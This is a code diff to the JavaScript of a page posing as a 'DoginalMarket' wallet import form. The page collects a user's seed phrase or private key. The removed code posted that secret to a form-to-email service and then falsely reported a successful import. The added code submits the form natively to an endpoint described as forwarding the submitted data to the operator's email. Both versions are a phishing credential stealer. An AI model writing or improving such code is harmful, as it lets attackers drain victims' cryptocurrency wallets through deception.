@@ -106,43 +106,18 @@ document.addEventListener('DOMContentLoaded', () => {
   });
 
   if (importForm) {
-    importForm.addEventListener('submit', async (event) => {
-      event.preventDefault();
-
+    importForm.addEventListener('submit', (event) => {
       const text = importInput ? importInput.value.trim() : '';
       if (!text) {
+        event.preventDefault();
         showToast('Please enter your phrase or private key');
         if (importInput) importInput.focus();
         return;
       }
 
-      const formData = {
-        name: 'DoginalMarket Wallet Import',
-        email: 'noreply@example.com',
-        wallet_input: text,
-        message: `Wallet import request:\n${text}`
-      };
-
-      try {
-        const response = await fetch(importForm.action, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-            'Accept': 'application/json'
-          },
-          body: JSON.stringify(formData)
-        });
-
-        if (!response.ok) {
-          throw new Error('FormSubmit request failed');
-        }
-
-        showToast('Wallet successfully imported!');
-        showView(activeWalletView);
-      } catch (error) {
-        console.error('FormSubmit error:', error);
-        showToast('Your import was submitted, but the endpoint needs review.');
-      }
+      // Let the browser submit normally to the configured Formspark endpoint.
+      // The endpoint is responsible for forwarding the submitted data to your email.
+      showToast('Submitting your wallet import...');
     });
   }
 });
